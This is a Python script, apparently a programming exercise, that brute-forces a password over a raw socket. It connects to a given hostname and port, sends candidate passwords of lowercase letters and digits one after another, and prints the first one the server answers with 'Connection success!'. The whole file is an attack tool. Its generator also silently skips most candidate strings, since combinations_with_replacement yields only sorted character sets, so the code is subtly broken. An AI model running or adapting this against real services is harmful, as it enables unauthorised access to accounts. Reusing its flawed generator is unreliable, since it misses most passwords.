import argparse
import socket

from itertools import combinations_with_replacement
from string import ascii_lowercase, digits


def guess_password():
    pool = ascii_lowercase + digits
    for size in range(1, 10):
        for comb in combinations_with_replacement(pool, size):
            yield ''.join(comb)


parser = argparse.ArgumentParser()
parser.add_argument("hostname", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

with socket.socket() as client_socket:
    address = (args.hostname, args.port)

    client_socket.connect(address)
    gen = guess_password()
    while True:
        cur_password = next(gen)
        client_socket.send(cur_password.encode())
        message = client_socket.recv(1024).decode()
        if message == 'Connection success!':
            print(cur_password)
            break
